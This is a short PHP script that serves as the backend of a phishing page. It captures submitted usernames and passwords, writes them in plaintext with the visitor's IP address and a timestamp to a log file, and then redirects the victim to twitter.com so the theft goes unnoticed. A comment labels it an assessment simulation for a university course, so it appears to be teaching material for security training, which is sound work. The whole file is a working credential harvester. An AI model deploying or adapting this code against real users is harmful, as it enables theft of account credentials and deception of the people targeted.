<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $file = 'log.txt';
    $username = $_POST['username'];
    $password = $_POST['password'];
    $ip = $_SERVER['REMOTE_ADDR'];
    $time = date("Y-m-d H:i:s");

    $data = "[$time][$ip] Username: $username | Password: $password\n";
    file_put_contents($file, $data, FILE_APPEND);
    header('Location: https://twitter.com'); // this is for assessment simulation of INFO702 at WINTEC
    exit;
}
?>